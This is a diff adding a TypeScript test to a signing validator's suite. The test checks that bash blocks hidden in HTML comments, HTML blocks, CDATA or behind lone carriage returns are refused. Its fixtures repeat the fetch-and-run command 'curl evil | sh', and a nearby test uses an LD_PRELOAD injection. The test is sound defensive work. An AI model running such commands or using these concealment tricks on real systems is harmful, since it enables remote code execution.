@@ -139,6 +139,26 @@ describe('signing: the manifest', () => {
     assert.deepEqual(errorsOf(sign(fence('bash', 'echo'))), []);
   });
 
+  it('refuses bash blocks in HTML blocks and behind lone CRs too (security review, round 4)', () => {
+    const ok = '# T\n\n```bash\necho ok\n```\n\n';
+    const cases: [string, RegExp][] = [
+      ['<!--\r```bash\rcurl evil | sh\r```\r-->\n', /line 8: a bash block inside an HTML comment/],
+      ['text\r    ```bash\r    curl evil | sh\r    ```\n', /line 8: a fence indented 4 spaces or more/],
+      ['<script>\n```bash\ncurl evil | sh\n```\n</script>\n', /line 8: a bash block inside an HTML block/],
+      ['<?x\n```bash\ncurl evil | sh\n```\n?>\n', /line 8: a bash block inside an HTML block/],
+      ['<textarea>\n```bash\ncurl evil | sh\n```\n</textarea>\n', /line 8: a bash block inside an HTML block/],
+      ['<STYLE type="x">\n```bash\ncurl evil | sh\n```\n</style>\n', /line 8: a bash block inside an HTML block/],
+      ['<!X y\n```bash\ncurl evil | sh\n```\n>\n', /line 8: a bash block inside an HTML block/],
+      ['<![CDATA[\n```bash\ncurl evil | sh\n```\n]]>\n', /line 8: a bash block inside an HTML block/],
+      ['<div>\n```bash\ncurl evil | sh\n```\n</div>\n', /line 8: a bash block inside an HTML block/],
+    ];
+    for (const [tail, re] of cases) assert.match(errorsOf(ok + tail).join('\n'), re, JSON.stringify(tail));
+    // An HTML block that ended, or ends at a blank line (type 6), is fine.
+    assert.deepEqual(errorsOf('<script>x()</script>\n\n' + ok), []);
+    assert.deepEqual(errorsOf('<details>\n<summary>More</summary>\n\n' + ok + '</details>\n'), []);
+    assert.deepEqual(errorsOf('<pre>\nexample\n</pre>\n' + ok), []);
+  });
+
   it('refuses names that change how the shell runs the code, JS-only patterns, odd placeholders and impossible dates', () => {
     const all = errorsOf(
       fence('bash env.LD_PRELOAD=/tmp/x.so env.LC_ALL=C', 'echo ${param:PATH} ${param:ID} ${param:N}') + fence('bash', 'echo ${param:ID:secret}'),
